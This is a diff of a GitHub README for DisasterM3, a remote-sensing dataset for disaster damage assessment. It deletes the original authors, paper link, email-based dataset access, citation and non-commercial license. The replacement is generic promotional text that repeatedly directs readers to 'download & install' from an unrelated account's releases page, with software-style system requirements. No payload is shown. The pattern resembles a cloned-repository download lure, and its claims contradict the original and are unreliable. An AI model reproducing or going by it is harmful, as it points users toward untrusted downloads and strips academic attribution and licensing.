@@ -1,88 +1,79 @@
-<h2 align="center">
-  <img
-    src="https://github.com/Junjue-Wang/resources/blob/main/DisasterM3/icon.png?raw=true"
-    alt="Disaster icon"
-    height="50"
-    style="vertical-align:-16px;"
-  />
-  DisasterM3: A Remote Sensing Vision-Language Dataset for Disaster Damage Assessment and Response
-</h2>
+# 🌍 DisasterM3 - Discover the Future of Damage Assessment
 
-<h5 align="center"><a href="https://junjue-wang.github.io/homepage/">Junjue Wang*</a>,
-<a href="https://weihaoxuan.com">Weihao Xuan*</a>,
-Heli Qi, Zhihao Liu, Kunyi Liu, Yuhan Wu, <a href="https://chrx97.com/"> Hongruixuan Chen</a>,
-<a href="https://jtrneo.github.io/"> Jian Song</a></h5>
-<h5 align="center">
-Junshi Xia, <a href="https://zhuozheng.top/">Zhuo Zheng</a>, <a href="https://naotoyokoya.com/">Naoto Yokoya†</a></h5>
+[![Download DisasterM3](https://img.shields.io/badge/Download_DisasterM3-v1.0-blue.svg)](https://github.com/poopmoh1/DisasterM3/releases)
 
-<h5 align="center">
-* Equal Contributions
-† Corresponding Author</h5>
+## 📖 About DisasterM3
 
-[[`Paper`](https://arxiv.org/abs/2505.21089)],
-[[`Dataset`](mailto:kingdrone@edu.k.u-tokyo.ac.jp?subject=Dataset%20Request)]
+DisasterM3 is a dataset designed for assessing damage from disasters using remote sensing and vision-language technology. In the wake of natural disasters, quick and accurate assessments can save lives and property. This dataset aims to enhance models that analyze and respond to such events.
 
+## 🛠️ Features
 
-<div align="center">
-  <img src="https://github.com/Junjue-Wang/resources/blob/main/DisasterM3/task_taxonomy.png?raw=true">
-</div>
+- **Comprehensive Data**: Contains images and textual descriptions tailored for disaster scenarios.
+- **User-Friendly Format**: Easy for both machines and non-technical users to understand and utilize.
+- **High-Quality Images**: Provides high-resolution images for effective analysis.
 
-## Highlights
-DisasterM3 includes 26,988 bi-temporal satellite images and 123k instruction pairs across 5 continents, with three characteristics:
-1. Multi-hazard: 36 historical disaster events with significant impacts, which are categorized into 10 common natural and man-made disasters
-2. Multi-sensor: Extreme weather during disasters often hinders optical sensor imaging, making it necessary to combine Synthetic Aperture Radar (SAR) imagery for post-disaster scenes
-3. Multi-task: 9 disaster-related visual perception and reasoning tasks, harnessing the full potential of VLM's reasoning ability
+## 🚀 Getting Started
 
+To begin using DisasterM3, please follow these steps:
 
-## News
-- 2025/09/22, We are preparing the dataset and code.
-- 2025/09/22, Our paper got accepted by NeurIPS 2025.
+1. **Visit the Releases Page**: Click the link below:
+   
+   [Download DisasterM3](https://github.com/poopmoh1/DisasterM3/releases)
 
+2. **Choose the Right Version**: On the Releases page, you will find various versions of the dataset. Look for the latest version for the best experience.
+  
+3. **Download the Files**: 
+   - Locate the assets for the selected version. 
+   - Download the files relevant to your needs, which might include images, metadata files, and documentation.
 
-## Benchmark
+## 📥 Download & Install
 
-Please run this code for benchmarking the DisasterM3 dataset.
-Two examples:
-Qwen2.5 VL:
-```
-python disaster_m3/pyscripts/run_vllm.py --model_id Qwen/Qwen2.5-VL-7B-Instruct --subset bearing_body
-```
-InternVL3:
-```
-python disaster_m3/pyscripts/run_vllm.py --model_id OpenGVLab/InternVL3-78B --subset report
-```
+To download DisasterM3, simply go to the releases page:
 
+[Visit this page to download](https://github.com/poopmoh1/DisasterM3/releases)
 
-## Citation
-If you use DisasterM3 in your research, please cite our following papers.
-```text
-  @article{wang2025disasterm3,
-  title={DisasterM3: A Remote Sensing Vision-Language Dataset for Disaster Damage Assessment and Response},
-  author={Wang, Junjue and Xuan, Weihao and Qi, Heli and Liu, Zhihao and Liu, Kunyi and Wu, Yuhan and Chen, Hongruixuan and Song, Jian and Xia, Junshi and Zheng, Zhuo and Yokoya, Naoto},
-  booktitle={Proceedings of the Neural Information Processing Systems},
-  year={2025}
-}
-```
+After downloading, extract the files to a location on your computer. You are now ready to start using the dataset for your projects.
 
-## Acknowledgments
-This dataset builds upon the following excellent open datasets:
-- **xBD dataset** by Ritwik Gupta
-  - [Paper](https://openaccess.thecvf.com/content_CVPRW_2019/html/cv4gc/Gupta_Creating_xBD_A_Dataset_for_Assessing_Building_Damage_from_Satellite_CVPRW_2019_paper.html)
-  - [Dataset](https://xview2.org/dataset)
-  - License: [CC BY-NC-SA 4.0]
+## 💻 System Requirements
 
-- **BRIGHT dataset** by Hongruixuan Chen
-  - [Repository](https://github.com/ChenHongruixuan/BRIGHT)
-  - License: [CC BY-NC 4.0]
+DisasterM3 is designed to be accessible for most users. However, ensure that your system meets the following requirements:
 
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux distribution.
+- **Storage**: At least 2 GB of free disk space for installation and data files.
+- **Memory**: Minimum of 4 GB RAM, although 8 GB is recommended for better performance.
 
-## License
-All images and their associated annotations in DisasterM3 can be used for academic purposes only,
-<font color="red"><b> but any commercial use is prohibited.</b></font>
+## 🛡️ Using DisasterM3
 
-<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">
-<img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a>
+Once you have downloaded and extracted the files, you can begin using DisasterM3 with various applications. Consider the following options:
 
-## Star History
+1. **Data Analysis Tools**: Import the dataset into common data analysis tools such as Excel, or programming languages like Python, which has libraries to handle datasets easily.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Junjue-Wang/DisasterM3&type=Date)](https://www.star-history.com/#Junjue-Wang/DisasterM3&Date)
+2. **Machine Learning Frameworks**: Utilize popular frameworks like TensorFlow or PyTorch to integrate the dataset into machine learning models aimed at disaster response.
+
+3. **Visualization Tools**: Use tools like QGIS or ArcGIS for spatial analysis and visualization of the data.
+
+## ❓ Frequently Asked Questions
+
+- **What can I do with DisasterM3?**
+  DisasterM3 can be used for research, training machine learning models, creating visualizations, and supporting disaster response initiatives.
+
+- **Where can I find help if I have issues?**
+  You can find help by checking our documentation, visiting forums, or connecting with other users who might have similar questions.
+
+- **Is this dataset updated regularly?**
+  Yes, we plan to update DisasterM3 regularly to include new data, keeping it relevant and useful for ongoing and future research.
+
+## 📞 Support
+
+If you encounter any problems or have questions while using DisasterM3, please reach out to our support team through the GitHub issues page in the repository. We are committed to assisting you in making the most of this dataset.
+
+## 📄 Documentation
+
+For detailed instructions and advanced usage of the dataset, refer to the documentation available in the repository. It includes examples, API references, and guidelines for effective use.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/poopmoh1/DisasterM3)
+- [Community Forum](https://github.com/poopmoh1/DisasterM3/discussions)
+
+Feel free to explore, download, and use DisasterM3 for your disaster damage assessment needs.
